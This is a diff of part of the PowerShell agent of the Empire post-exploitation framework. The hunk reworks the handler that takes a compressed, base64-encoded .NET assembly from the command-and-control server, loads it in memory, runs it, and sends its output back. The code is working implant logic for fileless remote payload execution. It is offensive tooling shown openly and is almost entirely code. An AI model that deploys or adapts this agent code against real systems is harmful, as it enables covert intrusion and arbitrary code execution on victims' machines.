@@ -1001,79 +1001,89 @@ function Invoke-Empire {
                 Encode-Packet -data $output -type $type -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'completed'
             }
-            elseif($type -eq 122){
-                try{
+            elseif ($type -eq 122) {
+                try {
                     $parts = $data.split(",");
                     $params = $parts[1..$parts.length];
                     $bytes = [System.Convert]::FromBase64String($parts[0]);
                     $ms = New-Object System.IO.MemoryStream;
                     $output = New-Object System.IO.MemoryStream;
                     $ms.Write($bytes, 0, $bytes.Length);
-                    $ms.Seek(0,0) | Out-Null;
+                    $ms.Seek(0, 0) | Out-Null;
                     $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
-                    $buffer = [System.Byte[]]::CreateInstance([System.Byte],4096);
-                    $bytesRead = $sr.Read($buffer, 0, $buffer.length);
-                    while($bytesRead -ne 0){
-                        $output.Write($buffer,0,$bytesRead);
-                        $bytesRead = $sr.Read($buffer, 0, $buffer.length);
+                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096);
+                    $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
 
+                    while ($bytesRead -ne 0) {
+                        $output.Write($buffer, 0, $bytesRead);
+                        $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                     }
+
                     $assemBytes = $output.ToArray();
                     $assem = [Reflection.Assembly]::load($assemBytes);
-                    #execute the assembly
+
+                    $JobName = "Job_" + [Guid]::NewGuid().ToString();
+
                     $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
-                    if(!$strmprop){
-                        # Write-Host("no output pipe")
+                    if (!$strmprop) {
+                        # If no OutputStream, directly invoke the Execute method
                         $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params);
-                    }
-                    else{
-                        # Write-Host("output pipe")
-                        #pipes to retrieve the output
+                        Set-Variable -Name $JobName -Value $Results -Scope Global;
+                    } else {
+                        # Create unique pipe streams for each task
                         $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
                         $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
                         $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
-                        $dict = @{"assembly" = $assem; "params" = $params; "pipe" = $pipeClientStream};
-                        # background the task. Essentially creating a "thread" for the task to run in
+
+                        $dict = @{
+                            "assembly" = $assem;
+                            "params"   = $params;
+                            "pipe"     = $pipeClientStream;
+                            "JobName"  = $JobName;
+                        }
+
                         $ps = [PowerShell]::Create();
-                        $task = $ps.AddScript('
+                        $job = $ps.AddScript('
                         [CmdletBinding()]
                         param(
-                            [System.Reflection.Assembly]
-                            $assembly,
-
-                            [String[]]
-                            $params,
-
-                            [IO.Pipes.AnonymousPipeClientStream]
-                            $Pipe
-
+                            [System.Reflection.Assembly] $assembly,
+                            [String[]] $params,
+                            [IO.Pipes.AnonymousPipeClientStream] $Pipe,
+                            [string] $JobName
                         )
                         try {
                             $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
-                            $streamProp.SetValue($null, $pipe, $null);
-                            $assembly.GetType("Task").GetMethod("Execute").Invoke($null,$params);
+                            if ($streamProp) {
+                                $streamProp.SetValue($null, $Pipe, $null);
                             }
-                        finally {
-                            $pipe.Dispose();
-                            }
-').AddParameters($dict).BeginInvoke();
+                            $result = $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params);
+
+                            # Store the result in a variable named after JobName
+                            Set-Variable -Name $JobName -Value $result -Scope Global;
+
+                        } finally {
+                            $Pipe.Dispose();
+                        }
+                        ').AddParameters($dict).BeginInvoke();
+
                         $pipeOutput = [Text.StringBuilder]::new();
                         $buffer = [char[]]::new($pipeServerStream.InBufferSize);
                         while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                             [void]$pipeOutput.Append($buffer, 0, $read);
                         }
-                        $ps.EndInvoke($task);
+                        $ps.EndInvoke($job);
                         $Results = $pipeOutput.ToString();
+
+                        Set-Variable -Name $JobName -Value $Results -Scope Global;
                     }
-                    Encode-Packet -data $results -type 40 -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'completed'
-                }
-                catch {
-                    Encode-Packet -type 0 -data '[!] Error while executing assembly' -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'error'
+                    Encode-Packet -data $Results -type 122 -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed';
+                } catch {
+                    $errorMessage = $_.Exception.Message;
+                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $errorMessage" -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error';
                 }
             }
-
             # return the currently running jobs
             elseif($type -eq 50) {
                 # Filter the tasks and create a list of strings for each task
